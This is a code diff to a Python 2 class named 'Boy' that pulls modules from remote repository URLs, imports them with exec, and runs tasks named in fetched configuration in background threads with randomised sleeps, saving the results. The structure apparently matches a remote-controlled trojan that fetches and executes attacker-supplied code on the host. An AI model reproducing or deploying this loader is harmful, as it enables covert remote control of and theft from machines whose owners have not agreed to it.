@@ -56,11 +56,19 @@ class Boy(object):
 
     def install(self):
         for pkg, url in self.base_modules.items():
-            add_remote_repo([pkg], url)
+            try:
+                add_remote_repo([pkg], url)
+                # __import__(pkg)
+                print 'Try to import %s' % pkg
+                exec "import %s" % pkg
+            except Exception:
+                print 'exception with %s' % pkg
+                pass
         for m in self.run_modules:
             try:
                 exec "from toy.modules import %s" % m
             except Exception:
+                print 'exception with %s' % m
                 pass
 
     @staticmethod
@@ -83,14 +91,16 @@ class Boy(object):
     def dec(data):
         pass
 
+    def worker(self, m):
+        self.task_queue.put(1)
+        result = sys.modules[m].run()
+        self.task_queue.get()
+        self.save_result(result)
+        return
+
     def run(self):
         self.install()
-        def worker(m):
-            self.task_queue.put(1)
-            result = sys.modules[m].run()
-            self.task_queue.get()
-            self.save_result(result)
-            return
+
         while True:
             if self.task_queue.empty():
                 tasks = self.get_config(
@@ -99,7 +109,7 @@ class Boy(object):
                     try:
                         # exec "from toy.modules import %s" % rm
                         t = threading.Thread(
-                            target=worker, args=(task['module'],))
+                            target=self.worker, args=(task['module'],))
                         t.start()
                         time.sleep(random.randint(1, 10))
                     except Exception:
